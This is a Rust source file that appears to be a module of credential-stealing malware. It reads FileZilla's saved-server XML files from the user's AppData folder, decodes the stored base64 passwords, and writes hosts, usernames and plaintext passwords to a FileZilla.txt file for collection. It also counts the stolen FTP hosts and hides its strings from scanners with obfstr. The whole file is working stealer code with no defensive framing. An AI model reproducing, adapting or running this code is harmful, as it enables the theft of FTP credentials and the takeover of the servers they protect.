use alloc::borrow::ToOwned;
use alloc::format;
use alloc::string::{String, ToString};
use alloc::vec::Vec;
use collector::{Collector, Software};
use obfstr::obfstr as s;
use tasks::Task;
use utils::base64::base64_decode;
use utils::path::{Path, WriteToFile};
use windows::core::HSTRING;
use windows::Data::Xml::Dom::XmlDocument;

pub(super) struct FileZillaTask;

impl<C: Collector> Task<C> for FileZillaTask {
    unsafe fn run(&self, parent: &Path, collector: &C) {
        let servers = collect_servers();

        if servers.is_empty() {
            return;
        }

        let mut deduped = Vec::new();

        for server in servers {
            if !deduped.contains(&server) {
                deduped.push(server);
            }
        }

        let servers: Vec<String> = deduped.iter().map(|server| {
            let password_decoded = base64_decode(server.password.as_bytes())
                .map(|decoded| String::from_utf8_lossy(&decoded).to_string());

            let password_str = match password_decoded {
                Some(ref s) => s.as_str(),
                None => &server.password,
            };

            format!(
                "Url: ftp://{}:{}/\nUsername: {}\nPassword: {}",
                server.host,
                server.port,
                server.user,
                password_str
            )
        }).collect();

        collector.software().increase_ftp_hosts_by(servers.len());

        let servers = servers.join("\n\n");
        let _ = servers.write_to(parent / s!("FileZilla.txt"));
    }
}

fn collect_servers() -> Vec<Server> {
    let mut result: Vec<Server> = Vec::new();
    let base = &Path::appdata() / s!("FileZilla");

    let paths = [
        (&base / s!("recentservers.xml"), s!("RecentServers").to_owned()),
        (&base / s!("sitemanager.xml"), s!("Servers").to_owned()),
    ];

    for (path, servers_node) in paths {
        if let Some(servers) = collect_servers_from_path(&path, servers_node) {
            result.extend(servers)
        }
    }

    result
}

fn collect_servers_from_path<S>(path: &Path, servers_node: S) -> Option<Vec<Server>>
where
    S: AsRef<str>,
{
    let mut result: Vec<Server> = Vec::new();

    if !path.is_exists() {
        return None;
    }

    let bytes = path.read_file();
    if bytes.is_err() {
        return None;
    }

    let bytes = bytes.ok()?;
    let content = String::from_utf8(bytes).ok()?;
    let content = HSTRING::from(content.as_str());

    let xml_doc = XmlDocument::new().ok()?;
    xml_doc.LoadXml(&content).ok()?;

    let root = xml_doc.DocumentElement().ok()?;
    let servers = root.SelectSingleNode(&HSTRING::from(servers_node.as_ref())).ok()?;

    let nodes = servers.SelectNodes(&HSTRING::from(s!("Server"))).ok()?;

    for i in 0..nodes.Length().ok()? {
        let server = nodes.Item(i).ok()?;

        let get_text = |name: &str| -> Option<String> {
            if let Some(child) = server.SelectSingleNode(&HSTRING::from(name)).ok() {
                Some(child.InnerText().ok()?.to_string_lossy())
            } else {
                Some(String::new())
            }
        };

        let host = get_text(s!("Host"))?;
        let port = get_text(s!("Port"))?.parse::<u16>().unwrap_or(0);
        let user = get_text(s!("User"))?;
        let password = get_text(s!("Pass"))?;

        result.push(Server {
            host,
            port,
            user,
            password
        })
    }

    Some(result)
}

#[derive(PartialEq)]
struct Server {
    host: String,
    port: u16,
    user: String,
    password: String
}